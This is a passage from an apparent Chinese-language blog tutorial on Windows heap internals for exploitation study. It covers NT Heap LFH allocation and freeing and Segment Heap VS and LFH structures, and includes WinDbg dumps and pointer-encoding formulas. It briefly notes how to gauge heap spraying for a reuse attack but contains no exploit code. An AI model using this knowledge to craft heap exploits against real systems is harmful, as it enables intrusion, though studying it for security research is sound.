Void</span><br><span class="line">   +0x038 SegmentCreate    : 3</span><br><span class="line">   +0x03c SegmentDelete    : 0</span><br><span class="line">   +0x040 MinimumCacheDepth : 0</span><br><span class="line">   +0x044 CacheShiftThreshold : 0</span><br><span class="line">   +0x048 SizeInCache      : 0</span><br><span class="line">   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +0x2a4 Buckets          : [129] _HEAP_BUCKET</span><br><span class="line">   +0x4a8 SegmentInfoArrays : [129] (null) </span><br><span class="line">   +0x8b0 AffinitizedInfoArrays : [129] (null) </span><br><span class="line">   +0xcb8 SegmentAllocator : (null) </span><br><span class="line">   +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</span><br><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x2bacb0704a8))</span><br><span class="line">(*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x2bacb0704a8))                 [Type: _HEAP_LOCAL_SEGMENT_INFO * [129]]</span><br><span class="line">    ....</span><br><span class="line">    [15]             : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]   0xF &lt;--0xF0（不包含头部）大小的堆块</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></li><li><p><code>RtlpActivateLowFragmentationHeap</code>调用 <code>RtlpCreateLowFragHeap</code> 创建一个 <code>_LFH_HEAP</code> 结构，并将其地址存入 <code>_heap-&gt;FrontEndHeap</code>只用NT heap的话这个地方是不存在的</p></li><li><p>调用 <code>RtlpExtend...</code> 系列函数</p></li><li><p><strong>由于前面创建结构会申请一些堆块，所以造成了第 18 次开始 chunk 申请不连续的假象。</strong></p></li></ul><p>第 19 次 malloc开始分配</p><h4 id="分配-Allocation"><a href="#分配-Allocation" class="headerlink" title="分配 (Allocation)"></a>分配 (Allocation)</h4><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759917256615.png" alt="1759917256615"></p><p>分配的核心逻辑在 <code>RtlpLowFragHeapAllocFromContext</code> 函数中，分为<strong>寻找可用 Subsegment</strong> 和<strong>从中获取 chunk</strong> 两步。</p><ol><li><strong>寻找可用的 Subsegment (内存池)</strong><ul><li><p>首先，检查当前尺寸的“首选”内存池 <code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</code> 中是否还有空闲块。通过检查 <code>ActiveSubsegment-&gt;AggregateExchg.Depth</code>（空闲块数量）来判断。 –&gt;reuse attack可以通过这里查看需要堆喷射多少堆块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dx -r1 ((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x2bacb070fc0)</span><br><span class="line">((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x2bacb070fc0)                 : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]</span><br><span class="line">    [+0x000] LocalData        : 0x2bacb070cc0 [Type: _HEAP_LOCAL_DATA *]</span><br><span class="line">    [+0x008] ActiveSubsegment : 0x2bacb105ed0 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x010] CachedItems      [Type: _HEAP_SUBSEGMENT * [16]]</span><br><span class="line">    [+0x090] SListHeader      [Type: _SLIST_HEADER]</span><br><span class="line">    [+0x0a0] Counters         [Type: _HEAP_BUCKET_COUNTERS]</span><br><span class="line">    [+0x0a8] LastOpSequence   : 0x3 [Type: unsigned long]</span><br><span class="line">    [+0x0ac] BucketIndex      : 0xf [Type: unsigned short]</span><br><span class="line">    [+0x0ae] LastUsed         : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x0b0] NoThrashCount    : 0x2 [Type: unsigned short]</span><br><span class="line">0:000&gt; dx -r1 ((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)</span><br><span class="line">((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)                 : 0x2bacb105ed0 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x000] LocalInfo        : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]</span><br><span class="line">    [+0x008] UserBlocks       : 0x2bacb10a240 [Type: _HEAP_USERDATA_HEADER *]</span><br><span class="line">    [+0x010] DelayFreeList    [Type: _SLIST_HEADER]</span><br><span class="line">    [+0x020] AggregateExchg   [Type: _INTERLOCK_SEQ]</span><br><span class="line">    [+0x024] BlockSize        : 0x10 [Type: unsigned short]</span><br><span class="line">    [+0x026] Flags            : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x028] BlockCount       : 0x3f [Type: unsigned short]</span><br><span class="line">    [+0x02a] SizeIndex        : 0xf [Type: unsigned char]</span><br><span class="line">    [+0x02b] AffinityIndex    : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x024] Alignment        [Type: unsigned long [2]]</span><br><span class="line">    [+0x02c] Lock             : 0x7 [Type: unsigned long]</span><br><span class="line">    [+0x030] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]</span><br><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)).AggregateExchg</span><br><span class="line">(*((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)).AggregateExchg                 [Type: _INTERLOCK_SEQ]</span><br><span class="line">    [+0x000] Depth            : 0x5 [Type: unsigned short]  </span><br><span class="line">    [+0x002 (14: 0)] Hint             : 0x3 [Type: unsigned short]</span><br><span class="line">    [+0x002 (15:15)] Lock             : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x002] Hint16           : 0x3 [Type: unsigned short]</span><br><span class="line">    [+0x000] Exchg            : 196613 [Type: long]</span><br></pre></td></tr></table></figure></li><li><p>如果 <code>ActiveSubsegment</code> 已满，则去“备用池” <code>CachedItems</code> 列表里寻找其他有空闲块的 <code>Subsegment</code>。如果找到，就将其设置为新的 <code>ActiveSubsegment</code>。</p></li><li><p>如果所有现有 <code>Subsegment</code> 都满了，则会 <strong>分配并初始化一个新的 <code>UserBlocks</code></strong> （即 <code>_HEAP_SUBSEGMENT</code>），并将其设置为 <code>ActiveSubsegment</code>。</p></li></ul></li><li><strong>从 Subsegment 中获取 Chunk</strong><ul><li><strong>获取随机数</strong> : 从一个全局的 256 元素随机数数组 <code>RtlpLowFragHeapRandomData</code> 中循环取值。这个随机数（范围 0x0 ~ 0x7F）用于增加分配地址的不可预测性。</li><li><strong>计算随机起始索引</strong> : 使用公式 <code>index = (random_value * max_index) &gt;&gt; 7</code> 计算出一个在 <code>UserBlocks</code> 内的随机起始搜索点。</li><li><strong>查找空闲块 (位图操作)</strong> : 从计算出的 <code>index</code> 开始，扫描 <code>UserBlocks-&gt;BusyBitmap</code>。</li><li>如果 <code>index</code> 对应的位是 <code>0</code>（空闲），则直接选中。</li><li>如果该位是 <code>1</code>（占用，即发生碰撞&#x2F;collision），则向后线性搜索，直到找到第一个为 <code>0</code> 的位。</li><li><strong>更新元数据</strong> :</li><li>将 <code>BusyBitmap</code> 中找到的位设置为 <code>1</code>。</li><li>更新 <code>ActiveSubsegment-&gt;AggregateExchg.Depth</code> 等统计信息。</li><li>在返回的 chunk 头部进行设置：<ul><li><code>chunk-&gt;PreviousSize</code> 被用来存储这个 chunk 在 <code>UserBlocks</code> 中的索引，便于释放时快速定位。</li><li><code>chunk-&gt;UnusedBytes</code> 的最高位被设置为 <code>1</code>（<code>|= 0x80</code>），标记这是一个由 LFH 分配的、处于“占用”状态的 chunk。</li></ul></li><li><strong>返回地址</strong> : 最后，将 chunk 的用户数据区地址返回给调用者。</li></ul></li></ol><h4 id="释放-Free"><a href="#释放-Free" class="headerlink" title="释放 (Free)"></a>释放 (Free)</h4><ul><li>在 <code>RtlpFreeHeapInternal</code> 函数中首先会检查释放的内存地址是否对齐 0x10 。</li><li>通过 <code>_HEAP_ENTRY-&gt;UnpackedEntry.UnusedBytes &amp; 0x3F</code> 是否为 0 判断 chunk 是否已被释放。</li><li>通过 <code>_HEAP_ENTRY-&gt;UnpackedEntry.SubSegmentCode</code> 找到对应的 <code>UserBlock</code> 进而找到 <code>HeapSubsegment</code> 。</li><li>通过 <code>UserBlock-&gt;EncodedOffsets</code> 再尝试找回 <code>_HEAP_ENTRY</code> 从而校验有无恶意修改。</li><li>将 <code>_HEAP_ENTRY.UnusedBytes</code> 设置为 0x80 。</li><li>将 <code>UserBlocks-&gt;BusyBitmap.Buffer</code> 中释放的 chunk 对应的位复位。</li></ul><h2 id="Segment-Heap"><a href="#Segment-Heap" class="headerlink" title="Segment Heap"></a>Segment Heap</h2><p>segment heap分配规则：</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764555740216.png" alt="1764555740216"></p><p>在常规的应用进程中，Windows使用Nt Heap，而在特定进程，例如lsass.exe,svchost.exe等系统进程中，Windows采用Segment Heap</p><p>Windows在系统进程中使用Segment Heap，部分应用也使用了Segment heap，比如Edge。对于特定的进程开启Segment Heap，需要在注册表里修改：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TestSegmentHeap.exe&quot;</span> /v FrontEndHeapDebugOptions /t REG_DWORD /d <span class="number">0</span>x8 /f</span><br></pre></td></tr></table></figure><h3 id="VS-堆"><a href="#VS-堆" class="headerlink" title="VS 堆"></a>VS 堆</h3><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764555139767.png" alt="1764555139767"></p><h4 id="相关结构体-2"><a href="#相关结构体-2" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="Segment-Heap-1"><a href="#Segment-Heap-1" class="headerlink" title="_Segment_Heap"></a>_Segment_Heap</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +0x000 EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +0x010 Signature        : Uint4B</span><br><span class="line">   +0x014 GlobalFlags      : Uint4B</span><br><span class="line">   +0x018 Interceptor      : Uint4B</span><br><span class="line">   +0x01c ProcessHeapListIndex : Uint2B</span><br><span class="line">   +0x01e AllocatedFromMetadata : Pos 0, 1 Bit</span><br><span class="line">   +0x020 CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +0x020 ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +0x028 UserContext      : Ptr64 Void</span><br><span class="line">   +0x030 ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +0x038 Spare            : Ptr64 Void</span><br><span class="line">   +0x040 LargeMetadataLock : Uint8B</span><br><span class="line">   +0x048 LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +0x058 LargeReservedPages : Uint8B</span><br><span class="line">   +0x060 LargeCommittedPages : Uint8B</span><br><span class="line">   +0x068 StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +0x080 MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +0x0d8 GlobalLockCount  : Uint2B</span><br><span class="line">   +0x0dc GlobalLockOwner  : Uint4B</span><br><span class="line">   +0x0e0 ContextExtendLock : Uint8B</span><br><span class="line">   +0x0e8 AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +0x0f0 UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +0x0f8 ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +0x100 SegContexts      : [2] _HEAP_SEG_CONTEXT</span><br><span class="line">   +0x280 VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +0x340 LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p><code>Signature</code>：区分堆类型的签名，对于 Segment Heap 总是 0xDDEEDDEE 。</p><p><code>SegContexts (_HEAP_SEG_CONTEXT)</code>：与 Segment 有关的管理结构体。</p><p><code>VsContext (_HEAP_VS_CONTEXT)</code>：Variable Size Allocation 的核心结构体，跟踪 variable size allocation 分配状态。</p><p><code>LfhContext ( _HEAP_LFH_CONTEXT)</code>：Low Fragmentation Heap 的核心结构体，跟踪 LFH 分配状态。</p><h5 id="HEAP-VS-CONTEXT"><a href="#HEAP-VS-CONTEXT" class="headerlink" title="_HEAP_VS_CONTEXT"></a>_HEAP_VS_CONTEXT</h5><p><code>FreeChunkTree (_RTL_RB_TREE)</code>：以红黑树管理空闲 chunk ，以chunk 大小维护，较大的 chunk 在右，较小的 chunk 在左。</p><p><code>Root</code>：指向红黑树的根节点。</p><ul><li><code>Encoded</code>：根据最低比特是否为 1 决定红黑树的指针是否加密（默认不加密）。加密方法是当前节点的指针异或当前节点的地址，对于 <code>Root</code> 为 <code>EncodedRoot = Root ^ FreeChunkTree</code></li></ul><p><code>SubsegmentList</code>：所有的 VS Subsegment 链表，实际存储的是 <code>SubsegmentList</code> 地址异或指向的 VS Subsegment 的地址。</p><p><code>DelayFreeContext (_HEAP_VS_DELAY_FREE_CONTEXT)</code>：<code>VsContext-&gt;Config</code> 决定是否开启（用户态默认不开启，内核态默认开启），当开启时释放的 chunk 会先放到 <code>DelayFreeContext</code> 这个单向链表中，当链表中的 chunk 达到一定数量的时候才会集中释放。</p><p><code>BackendCtx</code>：指向  <code>_SEGMENT_HEAP.SegContexts</code> 。这个指针异或了 <code>_HEAP_VS_CONTEXT</code> 的地址。</p><p><code>Callbacks</code>：用于管理 VS SubSegments 函数指针集合，函数指针都经过加密 <code>RtlpHpHeapGlobals.HeapKey ^ VsContext_addr ^ func_ptr</code> 。</p><ul><li><code>Allocate</code>：<code>RtlpHpSegVsAllocate</code></li><li><code>Free</code>：<code>RtlpHpSegLfhVsFree</code></li><li><code>Commit</code>：<code>RtlpHpSegLfhVsCommit</code></li><li><code>Decommit</code>：<code>RtlpHpSegLfhVsDecommit</code></li></ul><h5 id="RtlpHpHeapGlobals（-RTLP-HP-HEAP-GLOBALS）"><a href="#RtlpHpHeapGlobals（-RTLP-HP-HEAP-GLOBALS）" class="headerlink" title="RtlpHpHeapGlobals（_RTLP_HP_HEAP_GLOBALS）"></a>RtlpHpHeapGlobals（_RTLP_HP_HEAP_GLOBALS）</h5><p>在 Segment Heap 中，许多数据和指针都被加密了。<code>RtlpHpHeapGlobals</code> 用于存放加密用的一些 key 和其他信息。地址可以在windbg中使用 <code>dx ntdll!RtlpHpHeapGlobals</code>直接查找，该地址在 <code>ntdll.dll</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _RTLP_HP_HEAP_GLOBALS 0x7fffa3936f40</span><br><span class="line">ntdll!_RTLP_HP_HEAP_GLOBALS</span><br><span class="line">   +0x000 HeapKey          : 0x08a75e35`7d23470b</span><br><span class="line">   +0x008 LfhKey           : 0x2107b942`fbbdfd6a</span><br><span class="line">   +0x010 FailureInfo      : 0x00007fff`a39338b0 _HEAP_FAILURE_INFORMATION</span><br><span class="line">   +0x018 CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +0x038 Flags            : 3</span><br><span class="line">   +0x038 FlagsBits        : &lt;unnamed-tag&gt;</span><br></pre></td></tr></table></figure><ul><li><code>HeapKey</code>：8 字节随机数，用于 VS Allocator 和 Segment Allocator 中的数据加密。</li><li><code>LfhKey</code>：8 字节随机数，用于 LowFragmentationHeap 中的数据加密。</li></ul><h5 id="Allocated-Freed-Chunk"><a href="#Allocated-Freed-Chunk" class="headerlink" title="Allocated &#x2F; Freed Chunk"></a>Allocated &#x2F; Freed Chunk</h5><p><strong>空闲堆块</strong>： <code>FreeChunkTree</code> 中的chunk，头部占八字节，这 8 字节是用 <strong>XOR</strong> 编码的（_HEAP_VS_CHUNK_FREE_HEADER）</p><p>$$<br>\text{DecodedHeader} &#x3D; \text{EncodedHeader} \oplus \text{Address} \oplus \text{HeapKey}<br>$$</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764567797067.png" alt="1764567797067"></p><p><code>MemoryCost</code>：表示 chunk 被申请的时候会有多少 page 被提交</p><p><code>UnsafeSize</code>：堆块 <code>Size</code> ，右移 4 位</p><p><code>UnsafePrevSize</code>：前一个堆块 <code>Size</code> ，右移 4 位。</p><p><code>Allocated</code>：表示堆块是否空闲，已分配恒为 0x1</p><p><strong>已分配的堆块</strong>：HEAP_VS__SUBSEGMENT 中的chunk，头部占16字节（_HEAP_VS_CHUNK_HEADER）</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764568101375.png" alt="1764568101375"></p><p><code>EncodedSegmentPageOffset</code>：让堆管理器能够从任意一个 VS 堆块（Chunk）快速反向定位到管理这片内存区域的元数据头部（_HEAP_VS_SUBSEGMENT）。加密： <code>EncodedSegmentPageOffset = SegmentPageOffset ^ (int8)chunk address ^ (int8)RtlpHpHeapGlobals.HeapKey</code></p><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><ol><li>大小 <code>&lt;= 0x4000 - 16</code>，尝试走 LFH 机制。<ul><li>如果 LFH 桶已激活，直接分配。</li><li>如果未激活，增加热度计数器，达到阈值才激活，然后依照VS分配。</li></ul></li><li>如果大小 <code>&gt; 0x20000</code>，直接走大块分配接口。</li><li>VS分配：通过 <code>((Size + 0xf) &gt;&gt; 4) + 1</code> 计算出 <code>ChunkIndex</code> 。红黑树 <code>VSContext-&gt;FreeChunkTree</code> 中搜索大于 <code>ChunkIndex</code> 的最小的 chunk 。</li><li>找到后调会用 <code>RtlpHpVsChunkSplit</code> 将 chunk 从红黑树中取出并切掉多余的 chunk ，然后将多余的 chunk 插入到 <code>VSContext-&gt;FreeChunkTree</code><ul><li>切割前会验证所属的 <code>VSSubsegment</code>的 <code>(VSSubsegment-&gt;Signature ^ VSSubsegment-&gt;Size ^ 0x2BED) &amp; 0x7FFF == 0</code></li></ul></li><li>如果找不到合适的 chunk 会调用 <code>RtlpHpVsSubsegmentCreate</code> 函数使用 Segment Allocation 分配一个新的 <code>VSSubsegment</code><ul><li>检查 <code>VSContext-&gt;SubsegmentList.Blink.Flink = VSContext-&gt;SubsegmentList</code> ，如果检查通过则将新创建的 <code>VSSubsegment</code> 从 <code>SubsegmentList.Blink</code> 插入到 <code>SubsegmentList</code> 链表中</li><li>将新申请的 <code>VSSubsegment</code> 中的 chunk 插入到 <code>VSContext-&gt;FreeChunkTree</code> 中然后重新在红黑树中搜索合适的 chunk</li></ul></li></ol><h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>对于当前block的校验</p><ol><li>如果 <code>BlockPtr</code> 最低 16 比特（0xFFFF）为 0 则判定为 Large Block 堆分配。（因为Large Block通常是按 64KB 对齐的）</li><li>通过 <code>ChunkHeader.Allocated</code> 判断 chunk 是否已被释放来防止 double free</li><li>解密 <code>ChunkHeader.EncodedSegmentPageOffset</code>，通过 <code>SegmentPageOffset</code> 找到 <code>VSSubsegment</code> 并校验这个 <code>VSSubsegment</code> 的 <code>Signature</code>（VSSubsegment-&gt;Signature ^ VSSubsegment-&gt;Size ^ 0x2BED) &amp; 0x7FFF &#x3D;&#x3D;0）</li><li>调用 <code>RtlpHpVsChunkCoalesce</code> 函数来合并<ol><li>更新 chunk 的 <code>Allocated</code> 为 0</li><li>通过 <code>UnsafePrevSize</code> 判断是否有前一个空闲 chunk，然后判断其allocate位是否为0；同样判断后一个相邻 chunk</li></ol></li><li>如果在 LFH 范围且未开启 LFH （即对应 <code>Buckets</code> 为初始化）则将对应 <code>LfhContext-&gt;Bucket</code> 减 1 （与 Nt Heap 相同）。</li></ol><p>其他检查后续补充</p><h3 id="LFH堆-1"><a href="#LFH堆-1" class="headerlink" title="LFH堆"></a>LFH堆</h3><p>LFH 堆分配的 chunk 没有 chunk header</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764576906996.png" alt="1764576906996"></p><h4 id="相关结构体-3"><a href="#相关结构体-3" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="HEAP-LFH-CONTEXT"><a href="#HEAP-LFH-CONTEXT" class="headerlink" title="_HEAP_LFH_CONTEXT"></a>_HEAP_LFH_CONTEXT</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_LFH_CONTEXT *)0x17025b50380))</span><br><span class="line">(*((ntdll!_HEAP_LFH_CONTEXT *)0x17025b50380))                 [Type: _HEAP_LFH_CONTEXT]</span><br><span class="line">    [+0x000] BackendCtx       : 0x17025b50140 [Type: void *]</span><br><span class="line">    [+0x008] Callbacks        [Type: _HEAP_SUBALLOCATOR_CALLBACKS]</span><br><span class="line">    [+0x030] AffinityModArray : 0x7fffa38e83db : 0x1 [Type: unsigned char *]</span><br><span class="line">    [+0x038] MaxAffinity      : 0x10 [Type: unsigned char]</span><br><span class="line">    [+0x039] LockType         : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x03a] MemStatsOffset   : -768 [Type: short]</span><br><span class="line">    [+0x03c] Config           [Type: _RTL_HP_LFH_CONFIG]</span><br><span class="line">    [+0x040] BucketStats      [Type: _HEAP_LFH_SUBSEGMENT_STATS]</span><br><span class="line">    [+0x048] SubsegmentCreationLock : 0x0 [Type: unsigned __int64]</span><br><span class="line">    [+0x080] Buckets          [Type: _HEAP_LFH_BUCKET * [129]]</span><br></pre></td></tr></table></figure><p><code>BackendCtx</code>：指向 LFH 堆的后端堆分配器，即 <code>_SEGMENT_HEAP.SegContexts (_HEAP_SEG_CONTEXT)</code>指针未加密</p><p><code>Callbacks</code>：函数指针集合，<code>RtlpHpHeapGlobals.HeapKey ^ LFHContext_addr ^ func_ptr</code></p><ul><li><code>Allocate</code>：<code>RtlpHpSegLfhAllocate</code></li><li><code>Free</code>：<code>RtlpHpSegLfhVsFree</code></li><li><code>Commit</code>：<code>RtlpHpSegLfhVsCommit</code></li><li><code>Decommit</code>：<code>RtlpHpSegLfhVsDecommit</code></li></ul><p><code>Config (_RTL_HP_LFH_CONFIG)</code>：用于表示 LFH 管理堆块的属性。</p><ul><li><code>MaxBlockSize</code>：决定多大的堆块适用于 LFH 分配。</li><li><code>WitholdPageCrossingBlocks</code>：是否有跨页块。</li><li><code>DisableRandomization</code>：是否关闭 LFH 分配随机化。</li></ul><p><code>Buckets (_HEAP_LFH_BUCKET )</code>：<code>Buckets</code> 指针数组，通过最低位区分为 <code>_HEAP_LFH_BUCKET</code> 结构体和单纯的计数作用。</p><ul><li>如果 LFH 启动，每个 <code>Bucket</code> 存储了对应 <code>Size</code> 的 <code>_HEAP_LFH_BUCKET</code> 结构体地址。</li><li>如果 LFH 未启动，每个 <code>Bucket</code> 低 2 字节恒为 0x0001 ，高 2 字节存储了当前 <code>Size</code> 堆块的分配次数，每分配一次加 0x21，每释放一次减 1 。</li></ul><h5 id="HEAP-LFH-BUCKET"><a href="#HEAP-LFH-BUCKET" class="headerlink" title="_HEAP_LFH_BUCKET"></a>_HEAP_LFH_BUCKET</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_BUCKET</span><br><span class="line">ntdll!_HEAP_LFH_BUCKET</span><br><span class="line">   +0x000 State            : _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x038 TotalBlockCount  : Uint8B</span><br><span class="line">   +0x040 TotalSubsegmentCount : Uint8B</span><br><span class="line">   +0x048 ReciprocalBlockSize : Uint4B</span><br><span class="line">   +0x04c Shift            : UChar</span><br><span class="line">   +0x04d ContentionCount  : UChar</span><br><span class="line">   +0x050 AffinityMappingLock : Uint8B</span><br><span class="line">   +0x058 ProcAffinityMapping : Ptr64 UChar</span><br><span class="line">   +0x060 AffinitySlots    : Ptr64 Ptr64 _HEAP_LFH_AFFINITY_SLOT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>State (_HEAP_LFH_SUBSEGMENT_OWNER)</code>：用于记录 <code>Buckets</code> 的状态。</p><p><code>AffinitySlots (_HEAP_LFH_AFFINITY_SLOT)</code>： 存储了当前 <code>Bucket</code> 的 subsegment 管理信息。默认只有一个。</p><h5 id="HEAP-LFH-SUBSEGMENT-OWNER"><a href="#HEAP-LFH-SUBSEGMENT-OWNER" class="headerlink" title="_HEAP_LFH_SUBSEGMENT_OWNER"></a>_HEAP_LFH_SUBSEGMENT_OWNER</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">ntdll!_HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x000 IsBucket         : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Spare0           : Pos 1, 7 Bits</span><br><span class="line">   +0x001 BucketIndex      : UChar</span><br><span class="line">   +0x002 SlotCount        : UChar</span><br><span class="line">   +0x002 SlotIndex        : UChar</span><br><span class="line">   +0x003 Spare1           : UChar</span><br><span class="line">   +0x008 AvailableSubsegmentCount : Uint8B</span><br><span class="line">   +0x010 Lock             : Uint8B</span><br><span class="line">   +0x018 AvailableSubsegmentList : _LIST_ENTRY</span><br><span class="line">   +0x028 FullSubsegmentList : _LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>IsBucket</code>：区分是在 <code>Bucket</code> 上还是在 <code>AffinitySlots</code> 上， <code>Bucket</code> 中的 <code>State</code> 为1 。</p><p><code>BucketIndex</code>：当前 <code>Bucket</code> 的编号，通常可以利用这个值查找全局数组 <code>RtlpBucketBlockSizes</code> 来获取 <code>BlockSize</code>：<code>RtlpBucketBlockSizes[State.BucketIndex]</code></p><p><code>AvailableSubsegmentCount</code>：目前可用于分配的的 LFH Subsegments 数量。</p><p><code>AvailableSubsegmentList</code>：指向下一个可用的 LFH subsegment 。</p><p><code>FullSubsegmentList</code>：指向下一个全被使用的 LFH subsegment 。</p><h5 id="HEAP-LFH-SUBSEGMENT"><a href="#HEAP-LFH-SUBSEGMENT" class="headerlink" title="_HEAP_LFH_SUBSEGMENT"></a>_HEAP_LFH_SUBSEGMENT</h5><p>通过 <code>Buckets-&gt;AffinitySlots</code> 管理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_SUBSEGMENT</span><br><span class="line">ntdll!_HEAP_LFH_SUBSEGMENT</span><br><span class="line">   +0x000 ListEntry        : _LIST_ENTRY</span><br><span class="line">   +0x010 Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x010 DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE</span><br><span class="line">   +0x018 CommitLock       : Uint8B</span><br><span class="line">   +0x020 FreeCount        : Uint2B</span><br><span class="line">   +0x022 